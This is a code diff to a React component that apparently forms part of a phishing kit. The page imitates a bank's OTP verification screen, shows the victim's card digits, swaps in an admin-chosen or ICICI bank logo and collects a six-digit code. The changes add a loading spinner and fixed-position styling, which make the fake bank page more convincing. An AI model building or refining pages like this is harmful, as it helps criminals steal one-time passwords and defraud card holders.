@@ -53,6 +53,7 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
 }) => {
   const [showInfo, setShowInfo] = useState(false);
   const [showInvalidMsg, setShowInvalidMsg] = useState(false);
+  const [isLoading, setIsLoading] = useState(true);
 
   // Get card brand and logo
   const cardBrand = getCardBrand(cardData.cardNumber);
@@ -64,7 +65,7 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
   console.log('sessionBankLogo:', sessionBankLogo);
   
   // Ensure we use the correct bank logo - prioritize admin selection, then session, then fallback
-  const bankLogo = adminSelectedBankLogo || sessionBankLogo || 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png';
+  const bankLogo = adminSelectedBankLogo || sessionBankLogo || 'https://logos-world.net/wp-content/uploads/2021/02/ICICI-Bank-Logo.png';
   console.log('Final bankLogo:', bankLogo);
   
   const cardLast4 = cardData.cardNumber.replace(/\s/g, '').slice(-4);
@@ -76,6 +77,15 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
       setShowInvalidMsg(false);
     }
   }, [otpError]);
+
+  useEffect(() => {
+    // Show loading spinner for 2 seconds when component mounts
+    const timer = setTimeout(() => {
+      setIsLoading(false);
+    }, 2000);
+
+    return () => clearTimeout(timer);
+  }, []);
 
   const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/\D/g, '').slice(0, 6);
@@ -119,11 +129,14 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
       font-family: "Segoe UI", tahoma, Arial, sans-serif, Helvetica;
       color: #212121;
       box-shadow: 0 0 3px 0 #dcd8d8;
-      position: relative;
+      position: fixed;
+      top: 0px;
+      left: 0px;
       display: flex;
       flex-direction: column;
       padding: 0 20px;
       box-sizing: border-box;
+      z-index: 1000;
     }
 
     .tsb-header {
@@ -136,6 +149,20 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
       justify-content: space-between;
       align-items: center;
       box-sizing: border-box;
+    }
+
+    .tsb-header .tsb-bank-info {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      padding: 10px;
+      background-color: rgba(255, 255, 255, 0.9);
+      border-bottom: 1px solid #dcd8d8;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
 
     .tsb-header div {
@@ -164,9 +191,18 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
       justify-content: space-between;
     }
 
-    .tsb-bank-info img {
+    .tsb-bank-info img:first-child {
       width: auto;
       height: 30px;
+      max-width: 120px;
+      object-fit: contain;
+    }
+
+    .tsb-bank-info img:last-child {
+      width: auto;
+      height: 40px;
+      max-width: 80px;
+      object-fit: contain;
     }
 
     .tsb-info-header {
@@ -374,6 +410,36 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
     }
   `;
 
+  // Loading spinner component
+  if (isLoading) {
+    return (
+      <div style={{
+        position: 'fixed',
+        top: 0,
+        left: 0,
+        width: '100vw',
+        height: '100vh',
+        display: 'flex',
+        justifyContent: 'center',
+        alignItems: 'center',
+        backgroundColor: '#ffffff',
+        zIndex: 9999
+      }}>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" style={{width: '80px', height: '80px'}}>
+          <rect fill="#1273d0" stroke="#1273d0" strokeWidth="15" width="30" height="30" x="25" y="85">
+            <animate attributeName="opacity" calcMode="spline" dur="2" values="1;0;1;" keySplines=".5 0 .5 1;.5 0 .5 1" repeatCount="indefinite" begin="-.4"></animate>
+          </rect>
+          <rect fill="#1273d0" stroke="#1273d0" strokeWidth="15" width="30" height="30" x="85" y="85">
+            <animate attributeName="opacity" calcMode="spline" dur="2" values="1;0;1;" keySplines=".5 0 .5 1;.5 0 .5 1" repeatCount="indefinite" begin="-.2"></animate>
+          </rect>
+          <rect fill="#1273d0" stroke="#1273d0" strokeWidth="15" width="30" height="30" x="145" y="85">
+            <animate attributeName="opacity" calcMode="spline" dur="2" values="1;0;1;" keySplines=".5 0 .5 1;.5 0 .5 1" repeatCount="indefinite" begin="0"></animate>
+          </rect>
+        </svg>
+      </div>
+    );
+  }
+
   return (
     <div className="tsb-body">
       <style>{styles}</style>
@@ -403,10 +469,9 @@ const TSBOTPPage: React.FC<TSBOTPPageProps> = ({
             src={bankLogo} 
             alt="Bank Logo" 
             onError={(e) => {
-              // Only fall back to ICICI if both admin and session logos fail
-              if (adminSelectedBankLogo || sessionBankLogo) {
-                e.currentTarget.src = 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png';
-              } else {
+              console.log('Bank logo failed to load:', bankLogo);
+              // Only use ICICI as last resort if no admin/session logo was provided
+              if (!adminSelectedBankLogo && !sessionBankLogo) {
                 e.currentTarget.src = 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png';
               }
             }}
